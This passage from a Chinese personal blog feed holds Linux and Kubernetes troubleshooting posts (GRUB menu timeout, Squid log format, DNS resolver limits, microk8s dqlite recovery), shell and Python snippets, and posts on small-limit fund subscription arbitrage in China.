<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> queue <span class="keyword">import</span> Queue</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"><span class="comment"># A thread that produces data</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">producer</span>(<span class="params">out_q</span>):</span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	<span class="comment"># Produce some data</span></span><br><span class="line">	...</span><br><span class="line">	out_q.put(data)</span><br><span class="line"><span class="comment"># A thread that consumes data</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">consumer</span>(<span class="params">in_q</span>):</span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		<span class="comment"># Get some data</span></span><br><span class="line">		data = in_q.get()</span><br><span class="line">		<span class="comment"># Process the data</span></span><br><span class="line">...</span><br><span class="line"><span class="comment"># Create the shared queue and launch both threads</span></span><br><span class="line">q = Queue()</span><br><span class="line">t1 = Thread(target=consumer, args=(q,))</span><br><span class="line">t2 = Thread(target=producer, args=(q,))</span><br><span class="line">t1.start()</span><br><span class="line">t2.start()</span><br></pre></td></tr></table></figure>

<ul>
<li>对于生产者消费者速度有差异情况，可以为队列元素添加上限</li>
<li>get和put方法支持非阻塞方式和设定超时</li>
</ul>
<h3><span id="x20给关键代码加锁-使用threading库中的lock对象">&#x20;给关键代码加锁 —— 使用threading库中的Lock对象</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">lock = threading.Lock()</span><br><span class="line"><span class="keyword">with</span> lock:</span><br><span class="line">	XXX</span><br></pre></td></tr></table></figure>

<h2><span id="第十三章-脚本编程与系统管理">第十三章 脚本编程与系统管理</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">解析命令行选项</span><br><span class="line">argparse</span><br><span class="line">执行外部命令，获取输出</span><br><span class="line">subprocess.check\_output</span><br><span class="line">复制或启动文件</span><br><span class="line">shutil模块</span><br><span class="line">读取ini配置文件</span><br><span class="line">configparser</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>每天的三哥小鸡腿没了</title>
    <url>/2024/0313194703.html</url>
    <content><![CDATA[<p>查看印度基金(164824)公告，从2024年2月28日起，暂停印度基金的申购，限额100块的一拖七套利告一段落。这意味着看好印度股市的国内投资者，以后只能通过在场内买入获得份额。</p>
<span id="more"></span>

<p><img data-src="/2024/0313194703/image1.png"><br>关于暂停申购的原因，官方说是为<strong>保护基金持有人利益</strong>，这个说法真的是TM把我整乐了。太阳从西边出来了，镰刀喊着要保护韭菜的利益了，就问你信不信吧！真正原因我想应该是套利申购份额越来越多，基金公司外汇额度不够用了。为了保护所谓的投资者利益，每天放着这么多申购费都不赚，有钱不赚王八下蛋，这么有良心的基金公司把我感动的都快哭了！</p>
<p>印度基金作为唯一一支能投资三哥的基金，稀缺性比较强，目前溢价率在7%左右。后市缺少了套利大军的砸盘，估计溢价率会进一步抬升。如果你看好三哥市场，已经申购到手的份额不妨拿一拿，不急着卖，让子弹再飞一会。（个人利益相关，不构成投资建议）<br><img data-src="/2024/0313194703/image2.png"></p>
<p>总结下，这次的套利行情从1月19日开始，到2月28日结束，时间竟然持续一个月之久。如果每天坚持一拖七申购卖出，一个账户可以获利近1000元，你能搞3个账户就赚3000元，6个账户就赚6000元 。而为了赚到这个钱需要做的，无非就是事先用几个小时学习下基金套利的知识，再准备好几台拖拉机而已，教程网上一搜一大把。</p>
<p>这简单吗？太简单了，市场送钱我只管接就完事了。</p>
]]></content>
      <categories>
        <category>investment</category>
      </categories>
      <tags>
        <tag>investment</tag>
      </tags>
  </entry>
  <entry>
    <title>GRUB菜单不显示问题定位</title>
    <url>/2024/0321195218.html</url>
    <content><![CDATA[<h1><span id="问题描述">问题描述</span></h1><p>Rocky Linux 9.2环境，手工配置了<code>GRUB_TIMEOUT</code>为30秒，但重启后发现没有显示菜单，未出现30秒倒计时。</p>
<h1><span id="调试方法">调试方法</span></h1><p>梳理GRUB启动流程，下载GRUB源码并重新编译、安装、调试，具体步骤如下：</p>
<span id="more"></span>

<h1><span id="0-梳理grub启动流程">0. 梳理GRUB启动流程</span></h1><p>Linux启动流程参考： <a href="https://www.cnblogs.com/quan0311/p/15292110.html">谈谈Linux系统启动流程</a><br>GRUB启动流程参考下图：(图片非原创，转载)<br><img data-src="/2024/0321195218/image1.png"></p>
<h1><span id="1-确认grub版本号">1. 确认GRUB版本号</span></h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># rpm -qa | grep grub</span></span><br><span class="line">grub2-pc-2.06</span><br><span class="line"><span class="comment"># grub2-install --version</span></span><br><span class="line">grub2-install (GRUB) 2.06</span><br></pre></td></tr></table></figure>
<p>得到GRUB版本号为2.06</p>
<h1><span id="2-下载grub源码">2. 下载GRUB源码</span></h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://ftp.gnu.org/gnu/grub/grub-2.06.tar.gz</span><br><span class="line">tar -xzvf grub-2.06.tar.gz</span><br><span class="line"><span class="built_in">cd</span> grub-2.06</span><br></pre></td></tr></table></figure>
<h1><span id="3-修改grub源码添加调试日志">3. 修改GRUB源码，添加调试日志</span></h1><p>修改<code>grub-core/normal/menu.c</code>中的函数<code>run_menu</code></p>
<ul>
<li>使用<code>grub_printf</code>函数添加日志打印<code>timeout</code>，<code>timeout_style</code>, <code>default_entry</code></li>
<li>使用<code>grub_millisleep</code>函数休指定休眠时间(单位毫秒，休眠目的是让日志停留一段时间，方便定位）<br><img data-src="/2024/0321195218/image2.png"><br>kernel.img执行流程：<code>startup.S -&gt; grub_main -&gt; grub_load_normal_mode -&gt; grub_command_execute(&quot;normal&quot;, 0 ,0) -&gt; grub_show_menu -&gt; show_menu -&gt; run_menu -&gt; ...</code></li>
</ul>
<h1><span id="4-编译和安装grub">4. 编译和安装GRUB</span></h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install -y bison gcc flex  <span class="comment"># 安装必要依赖</span></span><br><span class="line">./configure --prefix=/usr	<span class="comment"># 笔者的RockyLinux9.2默认应安装到/usr, 其他环境只需后台确认下grub安装的路径，指定对应的prefix即可</span></span><br><span class="line">make <span class="comment"># 编译</span></span><br><span class="line">make install <span class="comment"># 安装</span></span><br><span class="line">grub2-install /dev/sda <span class="comment"># 重新安装GRUB到MBR, 根据你的环境把/dev/sda改成具体的虚拟硬盘设备</span></span><br></pre></td></tr></table></figure>
<h1><span id="5-重启后通过串口查看grub日志确认修改生效">5. 重启后，通过串口查看GRUB日志，确认修改生效</span></h1><p>串口日志打印如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GRUB loading.</span><br><span class="line">Welcome to GRUB!</span><br><span class="line">GET DEFAULT ENTRY: 0</span><br><span class="line">GET TIMEOUT: 1</span><br><span class="line">GET TIMEOUT STYLE: 2</span><br></pre></td></tr></table></figure>
<p>发现<code>timeout</code>值为1，<code>timeout_style</code>为2(TIMEOUT_STYLE_HIDDEN)，不符合预期的30秒设定，查看<code>/boot/grub2/grub.cfg</code>，找到了对应的代码段：<br><img data-src="/2024/0321195218/image3.png"><br>通过<code>grub2-editenv</code>命令查看<code>menu_auto_hide</code>这个环境变量的确存在，且值为1，所以匹配了else语句，<code>timeout</code>的值被设置了1秒</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># grub2-editenv - list | grep menu_auto_hide</span><br><span class="line">menu_auto_hide=1</span><br></pre></td></tr></table></figure>
<p>查看<a href="https://access.redhat.com/documentation/zh-cn/red_hat_enterprise_linux/9/html/considerations_in_adopting_rhel_9/ref_notable-changes-to-boot-loader_assembly_kernel">Rocky Linux官方文档</a>，找到了<code>menu_auto_hide</code>环境变量被设置的原因，以及解决方法：<br><img data-src="/2024/0321195218/image4.png"></p>
<h1><span id="参考资料">参考资料</span></h1><p>【1】 <a href="https://www.cnblogs.com/quan0311/p/15292110.html">谈谈Linux系统启动流程</a><br>【2】 <a href="https://access.redhat.com/documentation/zh-cn/red_hat_enterprise_linux/9/html/considerations_in_adopting_rhel_9/ref_notable-changes-to-boot-loader_assembly_kernel">Red hat Customer Portal</a></p>
]]></content>
      <categories>
        <category>troubleshooting</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>troubleshooting</tag>
        <tag>GRUB</tag>
      </tags>
  </entry>
  <entry>
    <title>如何自定义Squid日志格式, 添加请求方法等参数</title>
    <url>/2024/0321195713.html</url>
    <content><![CDATA[<p>查<a href="http://www.squid-cache.org/Doc/config/logformat/">Squid手册</a>，找到你需要添加的参数：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Field name syntax keys:</span><br><span class="line">	...</span><br><span class="line">	%rm</span><br><span class="line">	Request method</span><br><span class="line">	%ru</span><br><span class="line">	Request URL, without the query string</span><br><span class="line">	...</span><br></pre></td></tr></table></figure>

<p>修改Squid配置文件<code>/etc/squid/squid.conf</code>，在<code>logformat</code>开头的这一行中添加<code>%rm %ru</code>参数，如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">logformat customized  %tl %ts %6tr %&gt;a %Ss %03&gt;Hs %&gt;st %&lt;st %[un %Sh %&lt;A %mt <span class="string">&quot;%&#123;User-Agent&#125;&gt;h&quot;</span> %03&lt;Hs <span class="string">&quot;%rm %ru HTTP/%rv&quot;</span> %err_code</span><br><span class="line">access_log  /var/log/squid/access.log customized</span><br></pre></td></tr></table></figure>
<span id="more"></span>

<p>重启Squid, 查看<code>access.log</code>, 发现日志格式已成功修改<br><img data-src="/2024/0321195713/image1.png"></p>
<h1><span id="参考">参考</span></h1><p><a href="http://www.squid-cache.org/Doc/config/logformat/">http://www.squid-cache.org/Doc/config/logformat/</a></p>
]]></content>
      <categories>
        <category>Squid</category>
      </categories>
      <tags>
        <tag>Squid</tag>
      </tags>
  </entry>
  <entry>
    <title>购买基金前应阅读基金招募说明书</title>
    <url>/2024/0322200035.html</url>
    <content><![CDATA[<p>3月8号，华泰天金ETF(511670)离奇暴涨6.17%, 收盘价106.17元。作为一个净值100元的货币基金，正常收益一年也就2%，单日6%的溢价相当于用1天时间提前兑现3年的收益，一个货币基金也可以玩这么嗨，我实在是无法理解！</p>
<span id="more"></span>
<p><img data-src="/2024/0322200035/image1.png"></p>
<p>据传言，是因为大爷大妈们看到基金的名字中带有黄金，误以为是投资黄金的ETF，所以一通乱买把价格炒上去了。3月12日，华泰天金ETF以100.999元收盘，单日暴跌7%，高溢价买入的”投资者”们损失惨重，着实当了一回韭菜。</p>
<p>从韭菜们的经历中，我们可以吸取教训：<strong>在购买一个基金前，我们需要知道这个基金的底层资产是什么</strong>，了解这个基金的投资范围，投资策略，基金费用，交易规则，这些信息可以在基金招募说明书里找到。</p>
<p>以华泰天金ETF为例，可以从华泰官网上找到基金招募说明书。查看“基金的投资”部分，可以看出这是货币基金。<br><img data-src="/2024/0322200035/image2.png"></p>
<p>查看基金说明书中“基金份额的申购与赎回”部分，发现华泰天金ETF的净值始终为100元，无申购赎回费，T日申购T+2日到账。<br><img data-src="/2024/0322200035/image3.png"><br><img data-src="/2024/0322200035/image4.png"></p>
<p>这意味着，如果你在3月8号以净值100元申购，3月12日以开盘价102元卖出，4天收益率2%，年化收益高达182%！<strong>韭菜们的钱，挺容易赚的</strong> ^_^</p>
]]></content>
      <categories>
        <category>investment</category>
      </categories>
      <tags>
        <tag>investment</tag>
      </tags>
  </entry>
  <entry>
    <title>标普500LOF又来送钱，一拖七拖拉机开起来！</title>
    <url>/2024/0322200351.html</url>
    <content><![CDATA[<p>标普500LOF(161125)公告，3月22日开放申购，限额申购100元，溢价率达到了离谱的40%！！！为了平抑这不合理的溢价，我决定用一拖七拖拉机狠狠拖它一把！</p>
<span id="more"></span>
<p><img data-src="/2024/0322200351/image1.png"><br><strong>一拖七的注意事项：</strong></p>
<ul>
<li>标普500LOF属于深市基金，一个身份证可以使用3个深A账户+3个深基金账户+1个场外账户进行一拖七申购，这样每天可以申购100*7&#x3D;700元，收益放大七倍，多个身份证可以继续放大收益。</li>
<li>T日(3月22日)申购的份额，在T+2日(3月26日)晚上到达持仓, 在T+3日(3月27日)早盘可以卖出。</li>
<li>必须记住T日的操作是场内申购，千万别点错点成在场内买入！</li>
<li>你需要有场内申购费1折+没有最低5元消费限制的券商，否则申购100元的交易成本高达6%以上，纯给券商打工。</li>
</ul>
<p><strong>如何打造一拖七拖拉机：</strong></p>
<ul>
<li>你需要有华宝和银河账户，支持加挂3个深市股东号和3个深基金号，实现一键拖拉机申购，如下：<br><img data-src="/2024/0322200351/image2.jpeg"></li>
<li>没有开满6个深市股东&#x2F;基金号的，可以在银河增开。可以在公众号”中国结算营业厅”里查询自己所有的股东号。</li>
<li>增开可以在非交易时间进行。每次增开时，勾选1个深a加1个深基金，需上传身份证照片和视频，做电话回访，开满6个深市股东&#x2F;基金号需要最多3天时间。</li>
</ul>
]]></content>
      <categories>
        <category>investment</category>
      </categories>
      <tags>
        <tag>investment</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux双网卡环境概率出现DNS解析错误</title>
    <url>/2024/0327201019.html</url>
    <content><![CDATA[<h2><span id="测试环境">测试环境</span></h2><p>VMware Rocky Linux 9 虚拟机, 双网卡(eth0和eth1)配置如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eth0 10.206.216.27/24  DNS 10.204.16.18</span><br><span class="line">eth1 192.168.1.27/24   DNS 192.168.1.1</span><br></pre></td></tr></table></figure>
<h2><span id="问题描述">问题描述</span></h2><p>手动配置eth1的DNS后，网络不通，通过抓包发现是eth1的DNS server配置有误，<strong>但机器重启后网络有概率能恢复正常</strong>。</p>
<span id="more"></span>
<h2><span id="定位方法">定位方法</span></h2><p>在网络不通的时候，查看<code>/etc/resolv.conf</code>内容：<br><img data-src="/2024/0327201019/image1.png"><br>找到原因：<strong>libc解析器不支持超过3条以上的nameserver</strong>，网络不通的时候，可以正常工作的nameserver 10.204.16.18恰好在第4条，所以DNS解析失败。</p>
<p>解决方法：删掉第二、三行这两个系统自动生成的v6 dns server，保证<code>resolv.conf</code>里的nameserver记录不超过3条即可。</p>
<p>注意不要直接修改<code>/etc/resolv.conf</code>，RHEL9上删除nameserver可以使用<code>nmcli</code>，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmcli con mod eth0 ipv6.ignore-auto-dns yes</span><br><span class="line">nmcli con mod eth1 ipv6.ignore-auto-dns yes</span><br><span class="line">systemctl restart NetworkManager</span><br></pre></td></tr></table></figure>
<h2><span id="参考资料">参考资料</span></h2><p><a href="https://man7.org/linux/man-pages/man5/resolv.conf.5.html">man resolv.conf</a></p>
]]></content>
      <categories>
        <category>troubleshooting</category>
      </categories>
      <tags>
        <tag>troubleshooting</tag>
        <tag>Network</tag>
      </tags>
  </entry>
  <entry>
    <title>判断两个IP地址是否在同一网段(Shell实现)</title>
    <url>/2024/0328195011.html</url>
    <content><![CDATA[<h2><span id="代码实现">代码实现</span></h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 函数：提取 CIDR 的网络地址和子网掩码</span></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">extract_network</span></span>() &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$1</span> | awk -F <span class="string">&#x27;/&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">extract_subnet</span></span>() &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$1</span> | awk -F <span class="string">&#x27;/&#x27;</span> <span class="string">&#x27;&#123;print $2&#125;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 函数：将 IP 地址转换为二进制格式</span></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">ip_to_binary</span></span>() &#123;</span><br><span class="line">    <span class="built_in">local</span> ip=<span class="variable">$1</span></span><br><span class="line">    <span class="built_in">local</span> binary=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="built_in">local</span> IFS=<span class="string">&#x27;.&#x27;</span></span><br><span class="line">    <span class="built_in">local</span> octets=(<span class="variable">$ip</span>)</span><br><span class="line">    <span class="keyword">for</span> octet <span class="keyword">in</span> <span class="string">&quot;<span class="variable">$&#123;octets[@]&#125;</span>&quot;</span>; <span class="keyword">do</span></span><br><span class="line">        <span class="built_in">local</span> bin_octet=<span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="built_in">local</span> num=<span class="variable">$octet</span></span><br><span class="line">        <span class="keyword">for</span> (( i=<span class="number">0</span>; i&lt;<span class="number">8</span>; i++ )); <span class="keyword">do</span></span><br><span class="line">            bin_octet=$((num % <span class="number">2</span>))<span class="variable">$bin_octet</span></span><br><span class="line">            num=$((num / <span class="number">2</span>))</span><br><span class="line">        <span class="keyword">done</span></span><br><span class="line">        binary+=<span class="variable">$bin_octet</span></span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$binary</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<span id="more"></span>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 函数：比较两个 IP 地址是否在同一网段</span></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">same_network</span></span>() &#123;</span><br><span class="line">    network1=$(extract_network <span class="variable">$1</span>)</span><br><span class="line">    subnet1=$(extract_subnet <span class="variable">$1</span>)</span><br><span class="line">    network2=$(extract_network <span class="variable">$2</span>)</span><br><span class="line">    subnet2=$(extract_subnet <span class="variable">$2</span>)</span><br><span class="line"></span><br><span class="line">    binary1=$(ip_to_binary <span class="variable">$network1</span>)</span><br><span class="line">    binary2=$(ip_to_binary <span class="variable">$network2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 截取相同长度的二进制子串</span></span><br><span class="line">    binary1=$(<span class="built_in">echo</span> <span class="variable">$binary1</span> | <span class="built_in">cut</span> -c1-<span class="variable">$subnet1</span>)</span><br><span class="line">    binary2=$(<span class="built_in">echo</span> <span class="variable">$binary2</span> | <span class="built_in">cut</span> -c1-<span class="variable">$subnet2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$binary1</span>&quot;</span> == <span class="string">&quot;<span class="variable">$binary2</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;两个 CIDR 在同一网段&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;两个 CIDR 不在同一网段&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2><span id="测试">测试</span></h2><p>CIDR1&#x3D;”10.206.216.21&#x2F;24”<br>CIDR2&#x3D;”10.206.217.10&#x2F;24”<br>same_network $CIDR1 $CIDR2</p>
]]></content>
      <categories>
        <category>Shell</category>
      </categories>
      <tags>
        <tag>Shell</tag>
      </tags>
  </entry>
  <entry>
    <title>kubectl执行失败后等待一段时间重试(Shell实现)</title>
    <url>/2024/0328201659.html</url>
    <content><![CDATA[<p>使用Shell脚本实现功能： <code>kubectl</code>执行失败后，等待30秒后再重试，一共重试3次，代码如下：</p>
<span id="more"></span>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">KUBECTL_BIN=/var/lib/snapd/snap/bin/kubectl</span><br><span class="line"></span><br><span class="line">ERR_MSG_K8S_NOTRUNNING=<span class="string">&quot;microk8s is not running&quot;</span></span><br><span class="line">ERR_MSG_CONNECTION_TIMEOUT=<span class="string">&quot;connection timed out&quot;</span></span><br><span class="line">ERR_MSG_CONNECTION_REFUSED=<span class="string">&quot;refused - did you specify the right host or port&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">debuglog</span></span>() &#123;</span><br><span class="line">    <span class="built_in">local</span> log_content=<span class="variable">$&#123;@:1&#125;</span></span><br><span class="line">    <span class="built_in">local</span> <span class="built_in">caller</span>=$(<span class="built_in">basename</span> <span class="string">&quot;<span class="variable">$0</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;`date +&quot;</span>%Y-%m-%d %H:%M:%S<span class="string">&quot;` [<span class="variable">$caller</span>] INFO <span class="variable">$log_content</span>&quot;</span> 2&gt;&amp;1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">api_kubectlX</span></span>() &#123;</span><br><span class="line">    <span class="built_in">local</span> retry=<span class="variable">$1</span></span><br><span class="line">    <span class="built_in">shift</span></span><br><span class="line">    <span class="built_in">local</span> args=<span class="variable">$@</span></span><br><span class="line">    <span class="built_in">local</span> ret=0</span><br><span class="line">    <span class="built_in">local</span> cmdstr=<span class="string">&quot;<span class="variable">$&#123;args[@]&#125;</span>&quot;</span></span><br><span class="line">    <span class="built_in">local</span> tmpfile=$(<span class="built_in">mktemp</span>)</span><br><span class="line">    <span class="keyword">for</span> ((i=<span class="number">0</span>;i&lt;<span class="variable">$retry</span>;i++)); <span class="keyword">do</span></span><br><span class="line">        <span class="variable">$&#123;KUBECTL_BIN&#125;</span> <span class="variable">$@</span> 2&gt;<span class="string">&quot;<span class="variable">$tmpfile</span>&quot;</span></span><br><span class="line">        ret=$?</span><br><span class="line">        <span class="keyword">if</span> [ <span class="variable">$ret</span> -eq 0 ]; <span class="keyword">then</span></span><br><span class="line">            debuglog <span class="string">&quot;KUBECTL <span class="variable">$cmdstr</span> ret: 0&quot;</span></span><br><span class="line">            <span class="built_in">break</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">local</span> errinfo=$(&lt; <span class="string">&quot;<span class="variable">$tmpfile</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">local</span> need_retry=<span class="string">&quot;no&quot;</span></span><br><span class="line">        <span class="keyword">if</span> [ -n <span class="string">&quot;<span class="subst">$(echo <span class="string">&quot;<span class="variable">$errinfo</span>&quot;</span> | grep <span class="string">&quot;<span class="variable">$ERR_MSG_K8S_NOTRUNNING</span>&quot;</span>)</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">            need_retry=<span class="string">&quot;yes&quot;</span></span><br><span class="line">        <span class="keyword">elif</span> [ -n <span class="string">&quot;<span class="subst">$(echo <span class="string">&quot;<span class="variable">$errinfo</span>&quot;</span> | grep <span class="string">&quot;<span class="variable">$ERR_MSG_CONNECTION_TIMEOUT</span>&quot;</span>)</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">            need_retry=<span class="string">&quot;yes&quot;</span></span><br><span class="line">        <span class="keyword">elif</span> [ -n <span class="string">&quot;<span class="subst">$(echo <span class="string">&quot;<span class="variable">$errinfo</span>&quot;</span> | grep <span class="string">&quot;<span class="variable">$ERR_MSG_CONNECTION_REFUSED</span>&quot;</span>)</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">            need_retry=<span class="string">&quot;yes&quot;</span></span><br><span class="line">        <span class="keyword">elif</span> [ <span class="variable">$ret</span> -eq 143 ]; <span class="keyword">then</span> <span class="comment"># 143 means SIGTERM, just retry</span></span><br><span class="line">            need_retry=<span class="string">&quot;yes&quot;</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            need_retry=<span class="string">&quot;no&quot;</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> [ <span class="variable">$need_retry</span> != <span class="string">&quot;yes&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">            debuglog <span class="string">&quot;KUBECTL ret: <span class="variable">$ret</span>/(<span class="variable">$errinfo</span>) <span class="variable">$cmdstr</span>&quot;</span></span><br><span class="line">            <span class="built_in">break</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">        debuglog <span class="string">&quot;KUBECTL ret: <span class="variable">$ret</span>/(<span class="variable">$errinfo</span>) (retry:<span class="variable">$i</span>) <span class="variable">$cmdstr</span>&quot;</span></span><br><span class="line">        <span class="built_in">sleep</span> 30</span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line">    <span class="built_in">rm</span> -- <span class="variable">$&#123;tmpfile&#125;</span></span><br><span class="line">    <span class="built_in">return</span> <span class="variable">$ret</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">api_kubectl</span></span>() &#123;</span><br><span class="line">    <span class="built_in">local</span> args=(3 <span class="string">&quot;<span class="variable">$@</span>&quot;</span>)</span><br><span class="line">    api_kubectlX <span class="string">&quot;<span class="variable">$&#123;args[@]&#125;</span>&quot;</span></span><br><span class="line">    <span class="built_in">return</span> $?</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用方法：</span></span><br><span class="line">api_kubectl get ns</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Kubernetes</category>
      </categories>
      <tags>
        <tag>Kubernetes</tag>
      </tags>
  </entry>
  <entry>
    <title>Microk8s dqlite启动失败, raft_start(): io: load closed segment XXX: entries count in preamble is zero</title>
    <url>/2024/0328201320.html</url>
    <content><![CDATA[<h2><span id="定位步骤">定位步骤</span></h2><p>后台查看Microk8s相关进程：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  7281 ?        Ss    27:02 /bin/bash /var/lib/snapd/snap/microk8s/3699/apiservice-kicker</span><br><span class="line">749807 ?        S      0:00  \_ sleep 5</span><br><span class="line">  7290 ?        Ss     0:00 /bin/bash /var/lib/snapd/snap/microk8s/3699/run-cluster-agent-with-args</span><br><span class="line">  7362 ?        S      2:32  \_ python3 /snap/microk8s/3699/usr/bin/gunicorn3 cluster.agent:app --bind 0.0.0.0:25000 --keyfile /var/snap/microk8s/3699/certs/server.key --certfile /var/snap/microk8s/3699/certs/server.crt --timeout 240</span><br><span class="line">  7684 ?        S      0:02      \_ python3 /snap/microk8s/3699/usr/bin/gunicorn3 cluster.agent:app --bind 0.0.0.0:25000 --keyfile /var/snap/microk8s/3699/certs/server.key --certfile /var/snap/microk8s/3699/certs/server.crt --timeout 240</span><br><span class="line">  7310 ?        Ssl  399:16 /snap/microk8s/3699/bin/containerd --config /var/snap/microk8s/3699/args/containerd.toml --root /var/snap/microk8s/common/var/lib/containerd --state /var/snap/microk8s/common/run/containerd --address /var/snap/microk8s/common/run/containerd.sock</span><br></pre></td></tr></table></figure>
<p>和正常环境对比，发现<code>k8s-dqlite</code>, <code>kubelite</code>进程执行异常，如下：</p>
<span id="more"></span>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">7457 ?        Ssl  752:10 /snap/microk8s/3699/bin/k8s-dqlite --storage-dir=/var/snap/microk8s/3699/var/kubernetes/backend/ --listen=unix:///var/snap/microk8s/3699/var/kubernetes/backend/kine.sock:12379</span><br><span class="line">7489 ?        Ssl  1777:58 /snap/microk8s/3699/kubelite --scheduler-args-file=/var/snap/microk8s/3699/args/kube-scheduler --controller-manager-args-file=/var/snap/microk8s/3699/args/kube-controller-manager --proxy-args-file=/var/snap/microk8s/3699/args/kube-proxy --kubelet-args-file=/var/snap/microk8s/3699/args/kubelet --apiserver-args-file=/var/snap/microk8s/3699/args/kube-apiserver</span><br></pre></td></tr></table></figure>
<p>通过<code>journactl</code>查看错误日志:<br>fatal msg&#x3D;”Failed to start server: start node: raft_start(): io: <strong>load closed segment 0000000014232389-0000000014232597</strong>: entries batch 394 starting at byte 8384000: entries count in preamble is zero\n”<br>Feb 03 08:18:08 GIFOCTMSG02 systemd[1]: snap.microk8s.daemon-k8s-dqlite.service: Main process exited, code&#x3D;exited, status&#x3D;1&#x2F;FAILURE</p>
<p>根据关键字查Google找到解决方案：<a href="https://discuss.linuxcontainers.org/t/error-failed-to-start-dqlite-server-raft-start/6931">https://discuss.linuxcontainers.org/t/error-failed-to-start-dqlite-server-raft-start/6931</a></p>
<h2><span id="解决方法">解决方法</span></h2><p>根据错误日志中”segment <strong>0000000014232389-0000000014232597</strong>“的信息，找到出错的文件<code>/var/snap/microk8s/current/var/kubernetes/backend/0000000014232389-0000000014232597</code>，删除此文件后重启microk8s，发现问题解决。文件出错原因可能是因为机器被异常下电，导致文件损坏</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">microk8s stop</span><br><span class="line">rm /var/snap/microk8s/current/var/kubernetes/backend/0000000014232389-0000000014232597</span><br><span class="line">microk8s start</span><br></pre></td></tr></table></figure>
<p><code>/var/snap/microk8s/3699/var/kubernetes/backend</code>的文件如下：</p>
